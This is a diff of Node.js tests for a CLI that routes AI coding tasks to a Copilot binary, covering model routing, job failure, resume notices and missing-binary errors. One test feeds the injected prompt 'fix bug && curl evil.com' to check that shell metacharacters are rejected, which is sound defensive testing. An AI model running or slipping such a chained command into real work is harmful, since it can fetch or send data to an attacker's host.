@@ -153,6 +153,7 @@ test("task --effort low routes through the per-call CLI with --model claude-opus
     }
   );
   assert.equal(result.status, 0, `stderr: ${result.stderr}`);
+  assert.match(result.stdout, /fast ok/);
   const entries = readSpawnLog(spawnLog);
   const cli = entries.find((entry) => entry.argv.includes("-p"));
   assert.ok(cli, `expected a -p invocation; argvs: ${JSON.stringify(entries.map((entry) => entry.argv))}`);
@@ -175,6 +176,7 @@ test("task --effort high routes through the per-call CLI with --model claude-opu
     }
   );
   assert.equal(result.status, 0, `stderr: ${result.stderr}`);
+  assert.match(result.stdout, /opus ok/);
   const entries = readSpawnLog(spawnLog);
   const cli = entries.find((entry) => entry.argv.includes("-p"));
   assert.ok(cli, `expected a -p invocation`);
@@ -182,6 +184,111 @@ test("task --effort high routes through the per-call CLI with --model claude-opu
   assert.ok(
     modelIdx >= 0 && cli.argv[modelIdx + 1] === "claude-opus-4.6",
     `expected --model claude-opus-4.6; got ${JSON.stringify(cli.argv)}`
+  );
+});
+
+test("task --model rejects prompts containing shell metacharacters (injection defense)", () => {
+  const pluginData = makeTempDir();
+  const result = runCompanion(
+    ["task", "--model", "haiku", "fix bug && curl evil.com"],
+    { pluginData, script: buildScriptedPrompt("never") }
+  );
+  assert.notEqual(result.status, 0);
+  assert.match(
+    result.stderr,
+    /shell metacharacter/i,
+    `expected a metachar rejection message on stderr; got: ${result.stderr}`
+  );
+});
+
+test("task --model with a non-zero CLI exit records the job as failed", () => {
+  const pluginData = makeTempDir();
+  const result = runCompanion(
+    ["task", "--model", "haiku", "cancel me"],
+    {
+      pluginData,
+      script: buildScriptedPrompt("partial work", {
+        sessionId: "sess-cli-cancel-1",
+        stopReason: "cancelled"
+      })
+    }
+  );
+  assert.notEqual(result.status, 0);
+  const stateRoot = path.join(pluginData, "state");
+  const workspaceEntry = fs.readdirSync(stateRoot)[0];
+  const jobsDir = path.join(stateRoot, workspaceEntry, "jobs");
+  const jobFile = fs.readdirSync(jobsDir).find((name) => name.endsWith(".json"));
+  const job = JSON.parse(fs.readFileSync(path.join(jobsDir, jobFile), "utf8"));
+  assert.equal(job.status, "failed");
+});
+
+test("task --resume-last with --model emits a stderr notice and stays on the broker path", () => {
+  const pluginData = makeTempDir();
+  // Seed a completed job so resolveLatestTrackedTaskThread has a threadId
+  // to resume. Each runCompanion call inherits the same pluginData, so the
+  // second invocation can locate the first run's job record.
+  const seed = runCompanion(
+    ["task", "first"],
+    {
+      pluginData,
+      script: buildScriptedPrompt("seed ok", { sessionId: "sess-resume-seed" })
+    }
+  );
+  assert.equal(seed.status, 0, `seed stderr: ${seed.stderr}`);
+
+  const spawnLog = path.join(makeTempDir(), "spawn.jsonl");
+  const result = runCompanion(
+    ["task", "--resume-last", "--model", "haiku", "continue"],
+    {
+      pluginData,
+      script: buildScriptedPrompt("resumed ok", { sessionId: "sess-resume-seed" }),
+      spawnLog
+    }
+  );
+  assert.equal(result.status, 0, `stderr: ${result.stderr}`);
+  assert.match(
+    result.stderr,
+    /--model.*claude-haiku-4\.5.*ignored.*resume/i,
+    `expected resume+model ignored notice; got: ${result.stderr}`
+  );
+  // The broker spawned during the seed run is reused for the second
+  // invocation (ensureBrokerSession finds it via broker.json inside the
+  // shared pluginData), so the second companion may not spawn a fresh
+  // fake-copilot at all. The key contract under test is that the per-call
+  // CLI (-p) path is NOT taken when resuming — an empty or acp-only spawn
+  // log both satisfy that assertion.
+  const entries = readSpawnLog(spawnLog);
+  assert.ok(
+    !entries.some((entry) => entry.argv.includes("-p")),
+    `resume+model must not use the -p CLI path; argvs: ${JSON.stringify(entries.map((e) => e.argv))}`
+  );
+});
+
+test("task --model with a missing Copilot binary surfaces a non-zero exit and error", () => {
+  // Points COPILOT_COMPANION_COPILOT_COMMAND at a path that doesn't exist.
+  // This exercises the user-visible failure path: the availability probe in
+  // ensureCopilotAvailable rejects with a "not installed" message before
+  // runCopilotCli is ever reached. It's the same failure surface users get
+  // in production when the Copilot CLI isn't on PATH, so the assertion
+  // targets the rendered error rather than runCopilotCli's proc.on("error").
+  const pluginData = makeTempDir();
+  const result = runCompanion(
+    ["task", "--model", "haiku", "hi"],
+    {
+      pluginData,
+      script: buildScriptedPrompt("never"),
+      extraEnv: {
+        COPILOT_COMPANION_COPILOT_COMMAND: JSON.stringify([
+          path.join(makeTempDir(), "definitely-not-a-real-copilot-binary")
+        ])
+      }
+    }
+  );
+  assert.notEqual(result.status, 0);
+  assert.match(
+    result.stdout + result.stderr,
+    /not installed|ACP is unavailable|ENOENT|not found/i,
+    `expected a recognizable availability error; got: stdout=${result.stdout} stderr=${result.stderr}`
   );
 });
 
